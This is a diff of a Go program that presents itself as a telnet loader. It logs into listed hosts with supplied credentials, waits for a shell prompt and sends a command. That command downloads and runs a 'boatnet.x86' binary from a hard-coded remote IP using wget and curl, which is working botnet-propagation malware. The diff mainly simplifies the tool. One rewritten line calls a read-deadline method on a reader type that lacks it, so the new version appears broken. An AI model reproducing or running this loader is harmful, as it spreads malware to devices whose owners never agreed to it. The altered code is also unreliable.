@@ -2,104 +2,42 @@ package main
 
 import (
 	"bufio"
-	"fmt"
 	"net"
 	"os"
-	"strconv"
 	"strings"
-	"sync"
 	"time"
 )
 
 const (
-	payload       = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.67.244.57/hiddenbin/boatnet.x86; curl -O http://103.67.244.57/hiddenbin/boatnet.x86; cat boatnet.x86 >WTF; chmod +x *; ./WTF\n"
-	timeout       = 15 * time.Second
-	readBackLines = 10
+	payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.67.244.57/hiddenbin/boatnet.x86; curl -O http://103.67.244.57/hiddenbin/boatnet.x86; cat boatnet.x86 >WTF; chmod +x *; ./WTF\n"
+	timeout = 15 * time.Second
 )
 
 var loginPrompts = []string{"login:", "Login:", "username:", "Username:", "user:", "User:"}
 var passwordPrompts = []string{"Password:", "password:", "passwd:", "Pass:"}
 var shellPrompts = []string{"#", "$", ">", "~", "%", "@"}
 
-var (
-	successCounter int
-	mu             sync.Mutex
-	wg             sync.WaitGroup
-)
-
 func main() {
-	if len(os.Args) != 3 {
-		fmt.Println("Usage: ./loader <target_file> <threads>")
+	if len(os.Args) != 2 {
 		return
 	}
 
-	targetFile := os.Args[1]
-	threadCount, err := strconv.Atoi(os.Args[2])
-	if err != nil || threadCount < 1 {
-		fmt.Println("Invalid thread count")
-		return
-	}
-
-	printBanner(targetFile, threadCount)
-
-	for {
-		runOnce(targetFile, threadCount)
-	}
-}
-
-func printBanner(filename string, threads int) {
-	targetCount := countLines(filename)
-	fmt.Println("======================================")
-	fmt.Println("     Simple Telnet Loader (Go)        ")
-	fmt.Println("======================================")
-	fmt.Printf("File       : %s\n", filename)
-	fmt.Printf("Loaded     : %d targets\n", targetCount)
-	fmt.Printf("Threads    : %d\n", threads)
-	fmt.Printf("Start Time : %s\n", time.Now().Format("2006-01-02 15:04:05"))
-	fmt.Println("======================================\n")
-}
-
-func countLines(filename string) int {
-	file, err := os.Open(filename)
+	file, err := os.Open(os.Args[1])
 	if err != nil {
-		return 0
-	}
-	defer file.Close()
-
-	count := 0
-	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" && !strings.HasPrefix(line, "#") {
-			count++
-		}
-	}
-	return count
-}
-
-func runOnce(filename string, maxThreads int) {
-	file, err := os.Open(filename)
-	if err != nil {
-		fmt.Println("Failed to open file:", err)
 		return
 	}
 	defer file.Close()
 
-	sem := make(chan struct{}, maxThreads)
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
-		if line != "" && !strings.HasPrefix(line, "#") {
-			sem <- struct{}{}
-			wg.Add(1)
-			go func(line string) {
-				defer wg.Done()
-				handleTarget(line)
-				<-sem
-			}(line)
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
 		}
+		go handleTarget(line)
 	}
-	wg.Wait()
+
+	select {} // keep main thread alive
 }
 
 func handleTarget(entry string) {
@@ -113,8 +51,6 @@ func handleTarget(entry string) {
 	if len(auth) != 2 {
 		return
 	}
-	username := auth[0]
-	password := auth[1]
 
 	conn, err := net.DialTimeout("tcp", addr, timeout)
 	if err != nil {
@@ -125,36 +61,27 @@ func handleTarget(entry string) {
 
 	reader := bufio.NewReader(conn)
 
-	if !expectAny(conn, reader, loginPrompts) {
+	if !expectAny(reader, loginPrompts) {
 		return
 	}
-	conn.Write([]byte(username + "\n"))
+	conn.Write([]byte(auth[0] + "\n"))
 
-	if !expectAny(conn, reader, passwordPrompts) {
+	if !expectAny(reader, passwordPrompts) {
 		return
 	}
-	conn.Write([]byte(password + "\n"))
+	conn.Write([]byte(auth[1] + "\n"))
 
-	if !expectAny(conn, reader, shellPrompts) {
+	if !expectAny(reader, shellPrompts) {
 		return
 	}
 
-	mu.Lock()
-	successCounter++
-	fmt.Printf("\n[+] Success: %s | user: %s | pass: %s\n", addr, username, password)
-	mu.Unlock()
-
+	// Hanya print jika berhasil login dan kirim payload
+	println("[+] Success:", addr)
 	conn.Write([]byte(payload))
-	time.Sleep(500 * time.Millisecond)
-
-	output := readOutput(conn, reader)
-	fmt.Printf("[*] Payload sent: %s\n", addr)
-	fmt.Println("--------- Telnet Output ---------")
-	fmt.Print(output)
-	fmt.Println("--------- End Output ------------")
+	println("[*] Payload sent:", addr)
 }
 
-func expectAny(conn net.Conn, r *bufio.Reader, prompts []string) bool {
+func expectAny(r *bufio.Reader, prompts []string) bool {
 	buffer := ""
 	timeoutChan := time.After(timeout)
 
@@ -163,7 +90,7 @@ func expectAny(conn net.Conn, r *bufio.Reader, prompts []string) bool {
 		case <-timeoutChan:
 			return false
 		default:
-			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+			r.SetReadDeadline(time.Now().Add(2 * time.Second))
 			b, err := r.ReadByte()
 			if err != nil {
 				continue
@@ -179,17 +106,4 @@ func expectAny(conn net.Conn, r *bufio.Reader, prompts []string) bool {
 			}
 		}
 	}
-}
-
-func readOutput(conn net.Conn, r *bufio.Reader) string {
-	var lines []string
-	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
-	for i := 0; i < readBackLines; i++ {
-		line, err := r.ReadString('\n')
-		if err != nil {
-			break
-		}
-		lines = append(lines, strings.TrimRight(line, "\r\n"))
-	}
-	return strings.Join(lines, "\n")
 }
